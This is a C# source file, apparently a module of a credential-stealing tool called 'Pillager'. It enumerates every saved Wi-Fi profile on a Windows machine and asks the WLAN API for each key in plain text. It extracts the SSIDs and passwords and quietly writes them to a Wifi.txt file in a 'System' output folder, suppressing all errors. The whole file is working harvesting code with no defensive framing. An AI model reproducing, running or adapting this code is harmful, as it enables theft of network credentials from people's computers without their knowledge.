using System;
using System.IO;
using System.Text;
using System.Xml;
using Pillager.Helper;

namespace Pillager.SystemInfos
{
    internal class Wifi : ICommandOnce
    {
        private string GetMessage()
        {
            const int dwClientVersion = 2;
            IntPtr clientHandle = IntPtr.Zero;
            IntPtr pInterfaceList = IntPtr.Zero;
            Native.WLAN_INTERFACE_INFO_LIST interfaceList;
            Native.WLAN_PROFILE_INFO_LIST wifiProfileList;
            Guid InterfaceGuid;
            IntPtr profileList = IntPtr.Zero;
            string profileName;
            StringBuilder sb = new StringBuilder();

            try
            {
                // Open Wifi Handle
                Native.WlanOpenHandle(dwClientVersion, IntPtr.Zero, out _, ref clientHandle);

                Native.WlanEnumInterfaces(clientHandle, IntPtr.Zero, ref pInterfaceList);
                interfaceList = new Native.WLAN_INTERFACE_INFO_LIST(pInterfaceList);
                InterfaceGuid = interfaceList.InterfaceInfo[0].InterfaceGuid;
                Native.WlanGetProfileList(clientHandle, InterfaceGuid, IntPtr.Zero, ref profileList);
                wifiProfileList = new Native.WLAN_PROFILE_INFO_LIST(profileList);
                if (wifiProfileList.dwNumberOfItems <= 0) return null;
                sb.AppendLine("Found " + wifiProfileList.dwNumberOfItems + " SSIDs: ");
                sb.AppendLine("============================");
                sb.AppendLine("");

                for (int i = 0; i < wifiProfileList.dwNumberOfItems; i++)
                {
                    try
                    {
                        profileName = (wifiProfileList.ProfileInfo[i]).strProfileName;
                        int decryptKey = 63;
                        Native.WlanGetProfile(clientHandle, InterfaceGuid, profileName, IntPtr.Zero, out var wifiXmlProfile, ref decryptKey, out _);
                        XmlDocument xmlProfileXml = new XmlDocument();
                        xmlProfileXml.LoadXml(wifiXmlProfile);
                        XmlNodeList pathToSSID = xmlProfileXml.SelectNodes("//*[name()='WLANProfile']/*[name()='SSIDConfig']/*[name()='SSID']/*[name()='name']");
                        XmlNodeList pathToPassword = xmlProfileXml.SelectNodes("//*[name()='WLANProfile']/*[name()='MSM']/*[name()='security']/*[name()='sharedKey']/*[name()='keyMaterial']");
                        foreach (XmlNode ssid in pathToSSID)
                        {
                            sb.AppendLine("SSID: " + ssid.InnerText);
                            foreach (XmlNode password in pathToPassword)
                            {
                                sb.AppendLine("Password: " + password.InnerText);
                            }
                            sb.AppendLine("----------------------------");
                        }
                    }
                    catch (Exception ex)
                    {
                        sb.AppendLine(ex.Message);
                    }
                }
                Native.WlanCloseHandle(clientHandle, IntPtr.Zero);
            }
            catch { }
            return sb.ToString();
        }

        public override void Save(string path)
        {
            try
            {
                string savepath = Path.Combine(path, "System");
                string wifi = GetMessage();
                if (!string.IsNullOrEmpty(wifi))
                {
                    Directory.CreateDirectory(savepath);
                    File.WriteAllText(Path.Combine(savepath, "Wifi.txt"), wifi, Encoding.UTF8);
                }
            }
            catch { }
        }
    }
}
